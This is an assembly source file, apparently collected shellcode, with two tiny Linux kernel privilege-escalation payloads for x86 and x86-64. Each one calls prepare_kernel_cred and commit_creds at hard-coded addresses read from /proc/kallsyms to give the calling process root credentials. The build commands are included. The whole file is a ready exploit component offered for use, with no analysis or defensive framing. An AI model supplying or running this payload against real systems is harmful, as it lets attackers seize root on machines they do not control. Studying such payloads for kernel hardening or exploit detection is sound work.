;
; Author: BITAM Salim (github.com/soolidsnake)
; Lenght: 13 bytes
; x86
; Purpose: prepares root creds, then commit the creds
; gcc shellcode.s -m32 -nostdlib  -o shellcode -Ttext=0
;

.globl _start
_start:
        xor %eax , %eax
		call 0xc1071070; prepare_kernel_cred address from /proc/kallsyms
		call 0xc1070e80; commit_creds address from /proc/kallsyms
		ret


;
; Author: BITAM Salim (github.com/soolidsnake)
; Lenght: 17 bytes
; x86-64
; Purpose: prepares root creds, then commit the creds
; gcc shellcode.s -nostdlib  -o shellcode -Ttext=0
;

section .text
  global _start

_start:

        xor rdi , rdi
		call 0xffffffff8107ad80; prepare_kernel_cred address from /proc/kallsyms
		mov rdi, rax
		call 0xffffffff8107ab70; commit_creds address from /proc/kallsyms
		ret